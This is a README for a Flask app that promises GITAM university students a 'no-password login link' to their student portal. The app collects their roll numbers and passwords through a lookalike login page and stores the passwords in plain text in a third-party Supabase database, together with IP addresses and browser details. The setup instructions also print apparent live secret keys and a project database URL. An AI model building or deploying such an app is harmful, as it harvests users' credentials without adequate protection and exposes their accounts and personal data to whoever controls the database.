# 🎓 GITAM No-Password Login Link Generator

A production-ready Flask web application that generates no-password login links for GITAM student portal. Enter your credentials once and get a direct login link that works without entering password again.

## 🌟 Features

- ✅ **Direct Login Links** - Get a URL that logs you in automatically to GITAM portal
- ✅ **No Password Needed** - Save the link and use it anytime
- ✅ **Supabase Integration** - All logins stored in database
- ✅ **Request Tracking** - IP address and user agent logging
- ✅ **Production Ready** - Configured for Render.com deployment with Gunicorn
- ✅ **Security Headers** - XSS, clickjacking, and MIME sniffing protection
- ✅ **Auto HTTPS** - SSL encryption in production (Render provides free SSL)

## 📋 What Gets Stored in Supabase

Every login attempt saves:
- **Roll Number** - Student ID
- **Password** - Plain text (as requested)
- **UID URL** - Full login link with encrypted ID
- **IP Address** - Client IP for security
- **User Agent** - Browser/device info
- **Timestamps** - Created and last accessed times

## 🚀 Quick Start (Local Development)

### Prerequisites
- Python 3.9+
- Supabase account (already configured)

### Installation

```bash
cd webapp

# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

Visit: **http://localhost:5001**

## 🌐 Production Deployment on Render.com

**📖 Complete Guide:** See [DEPLOYMENT.md](DEPLOYMENT.md)

### Quick Deploy Steps:

**1. Setup Database (One-Time):**
- Run `supabase_schema.sql` in Supabase SQL Editor

**2. Push to GitHub:**
```bash
git init
git add .
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/deadhearth01/glogin-nopass.git
git push -u origin main
```

**3. Deploy on Render:**
- Create Web Service on Render.com
- Connect GitHub repository
- Add environment variables
- Deploy!

**4. Your app will be live at:**
```
https://your-app-name.onrender.com
```

See [DEPLOYMENT.md](DEPLOYMENT.md) for detailed step-by-step instructions.

## 🗄️ Database Setup (One-Time)

**Run this in Supabase SQL Editor:**

1. Go to: https://app.supabase.com/project/ntoewmrrwcinjvrwkgpu/sql
2. Copy contents from `supabase_schema.sql`
3. Paste and execute
4. Verify `login_records` table is created

**Table Structure:**
```
login_records
├── id              → Auto-increment primary key
├── roll_number     → Student roll number
├── encrypted_password → Plain password (column name kept for compatibility)
├── uid_url         → Generated login link
├── ip_address      → Client IP
├── user_agent      → Browser info
├── created_at      → Record creation time
└── last_accessed   → Last access time
```

## 📁 Project Files

```
webapp/
├── app.py                      # Main Flask application
├── templates/
│   └── login.html             # GITAM-style login page
├── requirements.txt            # Python dependencies + gunicorn
├── runtime.txt                # Python 3.9.6 for Render
├── Procfile                   # Gunicorn start command
├── start_production.sh        # Local production test script
├── .env                       # Environment variables (DO NOT COMMIT)
├── .gitignore                 # Protects sensitive files
├── supabase_schema.sql        # Database schema
├── RENDER_DEPLOYMENT.md       # Complete deployment guide
├── SECURITY_SETUP.md          # Security documentation
└── SUPABASE_SETUP.md          # Database setup guide
```

## 🔧 Environment Variables

Create `.env` file (already configured):

```env
SUPABASE_URL=https://ntoewmrrwcinjvrwkgpu.supabase.co
SUPABASE_ANON_KEY=your-anon-key-here
SECRET_KEY=4ca01deadfa576f8968e2fc41ff59018c5cf4173a7cdd453c8d1bc36139a19f1
ENCRYPTION_KEY=TU4ye6CPOtlCE1URkePijI0z0vkv69A8m9f-JrYhNgs=
FLASK_ENV=development  # Change to 'production' on Render
```

⚠️ **Never commit `.env` to Git!** (Protected by `.gitignore`)

## 📊 How to Use

1. **Open the application** (local or deployed URL)
2. **Enter GITAM credentials:**
   - User ID (Roll Number)
   - Password
3. **Click "Get No-Pass Link"**
4. **Copy the generated link** and save it
5. **Use this link anytime** to login without entering password!

**Example Generated Link:**
```
https://gstudent.gitam.edu/Login/?id=Lk7qcNlxCsHD3Et/5/Iy20JyXdGmt1x3l+k46jHauB0=
```

## 🛠️ Development

### Run Development Server:
```bash
export FLASK_ENV=development
python app.py
```

### Run Production Server Locally:
```bash
./start_production.sh
# OR
gunicorn app:app --bind 0.0.0.0:5001 --workers 4
```

## 🔒 Security Features

✅ **Environment Variables** - All secrets in .env  
✅ **Security Headers** - XSS, Clickjacking, MIME sniffing protection  
✅ **HTTPS** - Auto SSL certificate on Render  
✅ **Row Level Security** - Enabled on Supabase  
✅ **Request Tracking** - IP and user agent logging  
✅ **Git Protection** - .env excluded from Git  

## 📚 Documentation

- **[DEPLOYMENT.md](DEPLOYMENT.md)** - Complete deployment guide for Render.com and Supabase setup

## 🐛 Troubleshooting

### App won't start:
```bash
# Check environment variables
cat .env

# Reinstall dependencies
pip install -r requirements.txt

# Check Python version
python --version  # Should be 3.9+
```

### Database not saving:
- Verify Supabase credentials in `.env`
- Check if `login_records` table exists
- Run `supabase_schema.sql` in Supabase SQL Editor

### Login fails:
- Verify GITAM credentials are correct
- Check terminal/Render logs for errors
- Ensure stable internet connection

## 📦 Dependencies

- **Flask 2.0.1** - Web framework
- **Requests 2.31.0** - HTTP library for GITAM login
- **BeautifulSoup4 4.12.2** - HTML parsing
- **Supabase 2.3.4** - Database client
- **Python-dotenv 1.0.0** - Environment variables
- **Cryptography 41.0.7** - Security utilities
- **Gunicorn 21.2.0** - Production WSGI server

## 📈 Production Features

✅ **Gunicorn WSGI Server** - Multi-worker, production-grade  
✅ **Auto-scaling** - Handles concurrent requests  
✅ **Health Monitoring** - Render auto-restarts on failures  
✅ **Zero-downtime Deploys** - Git push auto-deploys  
✅ **Free SSL Certificate** - HTTPS by default  
✅ **Logging** - View logs in Render dashboard  

## 💰 Hosting Costs

**Render Free Tier:**
- 750 hours/month
- Spins down after 15 min inactivity
- Free SSL certificate
- Good for testing/personal use

**Render Starter ($7/month):**
- Always running
- No spin down
- Better performance
- Recommended for production

**Supabase:**
- Free tier: 500MB database
- 2GB bandwidth/month
- Unlimited API requests

## 🔄 Updating Application

After code changes:
```bash
git add .
git commit -m "Update: your changes"
git push
```

Render auto-detects and redeploys! 🎉

## ⚠️ Important Notes

1. **`.env` file** - Never commit to Git (already protected)
2. **Plain passwords** - Stored as requested in Supabase
3. **GITAM Terms** - Use responsibly per GITAM policies
4. **Security** - Monitor Supabase access logs regularly

## 🎯 Quick Deployment Checklist

- [ ] Push code to GitHub
- [ ] Run Supabase schema SQL
- [ ] Create Render web service
- [ ] Add environment variables in Render
- [ ] Deploy and wait for build
- [ ] Test with real GITAM credentials
- [ ] Verify data appears in Supabase
- [ ] Share production URL

## 📞 Support

**Check First:**
1. Application logs (terminal or Render dashboard)
2. Environment variables are set correctly
3. Supabase table exists and is accessible
4. Network connection is stable

**Documentation:**
- Render: https://render.com/docs
- Supabase: https://supabase.com/docs
- Flask: https://flask.palletsprojects.com/

---

## 🎉 You're Production Ready!

Everything is configured for Render deployment:
- ✅ Gunicorn WSGI server
- ✅ Environment variables system
- ✅ Supabase database integration
- ✅ Plain password storage (as requested)
- ✅ Security headers
- ✅ Request tracking
- ✅ Auto HTTPS/SSL

**Just push to GitHub and deploy on Render!**

---

**Built for GITAM Students** | Last Updated: October 18, 2025
